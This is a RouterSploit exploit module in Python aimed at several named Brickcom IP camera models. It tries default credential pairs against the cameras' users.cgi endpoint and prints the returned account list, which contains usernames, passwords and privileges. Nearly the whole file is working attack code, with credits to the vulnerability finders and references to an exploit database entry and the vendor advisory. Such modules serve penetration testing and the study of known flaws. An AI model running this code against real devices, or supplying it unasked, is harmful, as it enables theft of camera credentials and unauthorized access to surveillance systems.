from routersploit import (
    exploits,
    print_error,
    print_info,
    print_success,
    print_status,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for miscellaneous Brickcom cameras with "users.cgi".
    Allows remote credential disclosure by low-privilege user.
    """
    __info__ = {
        'name': 'Brickcom Remote Credentials Disclosure',
        'description': 'Exploit implementation for miscellaneous Brickcom cameras with "users.cgi".'
                       'Allows remote credential disclosure by low-privilege user.',
        'authors': [
            'Emiliano Ipar <@maninoipar>',  # vulnerability discovery
            'Ignacio Agustin Lizaso <@ignacio_lizaso>',  # vulnerability discovery
            'Gaston Emanuel Rivadero <@derlok_epsilon>',  # vulnerability discovery
            'Josh Abraham',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/42588/',
            'https://www.brickcom.com/news/productCERT_security_advisorie.php',
        ],
        'devices': [
            'Brickcom WCB-040Af',
            'Brickcom WCB-100A',
            'Brickcom WCB-100Ae',
            'Brickcom OB-302Np',
            'Brickcom OB-300Af',
            'Brickcom OB-500Af',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port', validators=validators.integer)  # default port

    credentials = [
        ('admin', 'admin'),
        ('viewer', 'viewer'),
        ('rviewer', 'rviewer'),
    ]

    def __init__(self):
        self.configuration = None
        self.resource = '/cgi-bin/users.cgi?action=getUsers'

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            print_status("Dumping configuration...")
            print_info(self.configuration)
        else:
            print_error("Exploit failed - target does not appear vulnerable")

    @mute
    def check(self):
        url = "{}:{}{}".format(self.target, self.port, self.resource)
        for credential in self.credentials:
            response = http_request(method="GET", url=url, auth=credential)
            if response is None:
                break

            if any([setting in response.text for setting in ["username", "password", "privilege"]]):
                self.configuration = response.text
                return True  # target is vulnerable

        return False  # target is not vulnerable
